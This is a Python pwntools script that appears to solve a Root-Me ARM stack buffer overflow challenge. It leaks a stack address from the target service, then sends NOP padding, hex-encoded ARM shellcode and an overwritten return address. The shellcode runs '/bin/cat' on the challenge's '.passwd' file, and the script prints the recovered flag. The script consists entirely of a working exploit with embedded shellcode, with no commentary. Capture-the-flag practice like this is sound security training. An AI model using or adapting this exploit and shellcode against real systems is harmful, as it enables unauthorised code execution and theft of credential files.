from pwn import * 
import socket
import time 
import struct 

HOST = 'challenge04.root-me.org'
PORT = 61045

context(arch='arm', os='linux')

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

time.sleep(2)

resp = sock.recv(1024)

if ('Give me data to dump' not in resp.decode()):

    print('Failed to initiate connexion')
    exit(0)

sock.send(b'A\n')
time.sleep(2)

resp = sock.recv(1024)

if ('Dump again' not in resp.decode()):

    print('Failed to get the stack address')
    exit(0)

rip = resp.decode().split(':')[0]


sock.send(b'y\n')
time.sleep(2)
resp = sock.recv(1024)

if ('Give me data to dump' not in resp.decode()):

    print('Failed to get the redump')
    exit(0)

# exploitation 
shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x5a\x2f\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x2f\x61\x70\x70\x2d\x73\x79\x73\x74\x65\x6d\x65\x2f\x63\x68\x34\x35\x2f\x2e\x70\x61\x73\x73\x77\x64'
offset = 164 
padding = asm('nop') * 21 
# 21 = (offset - len(shellcode)) // len(asm('nop'))

rip = struct.pack('I', int(rip, 16))

payload = padding + shellcode + rip + b'\n'
sock.send(payload)
time.sleep(2)

resp = sock.recv(1024)
if ('Dump again' not in resp.decode()):

    print('Failed to send the shellcode')
    exit(0)

sock.send(b'n\n')
time.sleep(2)
resp = sock.recv(1024)

print("[+] flag: {}".format(resp.decode()))
